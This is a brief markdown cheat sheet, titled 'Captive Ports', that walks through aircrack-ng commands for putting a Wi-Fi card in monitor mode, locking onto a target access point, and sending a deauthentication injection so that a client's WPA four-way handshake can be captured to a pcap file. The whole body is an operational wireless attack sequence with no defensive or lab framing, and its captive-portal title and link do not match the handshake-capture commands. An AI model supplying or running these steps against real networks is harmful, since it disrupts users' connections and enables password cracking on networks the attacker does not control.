# Captive Ports


## Commands

```bash
# Start monitor mode
sudo airmon-ng start wlan0

# Start monitoring for APs
sudo airodump-ng wlan0mon

# Find target and gather BSSID,CHANNEL,CLIENT,SSID info
# Stop monitoring
qq

# Create and source config file described here
# Start a screen session with a horizonal split screen

# Restart monitoring but filtered with output saved to PCAP. Make sure CLIENT is found.
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap wlan0mon

# Do one deauth injection attack while still monitoring
sudo aireplay-ng -0 1 -a $BSSID -c $CLIENT wlan0mon

# Wait for the four-way handshake to appear in airodump-ng window.
# Stop airodump-ng when it appears
qq

```

## References

* [Wiki](https://en.wikipedia.org/wiki/Captive_portal)